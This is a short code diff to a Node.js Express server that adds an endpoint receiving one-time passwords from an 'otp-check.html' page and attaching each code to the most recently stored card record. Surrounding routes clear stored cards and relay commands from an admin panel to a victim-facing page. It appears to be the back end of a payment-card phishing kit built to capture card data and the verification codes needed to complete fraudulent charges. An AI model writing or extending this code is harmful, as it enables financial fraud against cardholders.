@@ -71,6 +71,23 @@ app.delete('/api/cards', (req, res) => {
   res.json({ success: true, message: 'All cards cleared' });
 });
 
+// ── OTP RECEIVER ────────────────────────────────────────────────────────────
+// POST /api/otp — otp-check.html sends the OTP; merged into the latest card
+app.post('/api/otp', (req, res) => {
+  try {
+    const { otp, cardLast4, timestamp, source } = req.body || {};
+    if (!otp) return res.status(400).json({ error: 'otp required' });
+    if (cardList.length === 0) return res.status(404).json({ error: 'No cards stored' });
+    // Merge OTP into the most recent card
+    const card = cardList[0];
+    cardList[0] = { ...card, otp, otpAt: timestamp || new Date().toISOString(), otpSource: source || 'otp-check' };
+    console.log(`OTP received for card ${card.cardId}: ${otp}`);
+    res.json({ success: true, cardId: card.cardId });
+  } catch (err) {
+    res.status(400).json({ error: err.message });
+  }
+});
+
 // ── COMMAND RELAY (admin panel → suite.html) ────────────────────────────────
 // In-memory store: { cardId: { target, timestamp } }
 const commandStore = {};
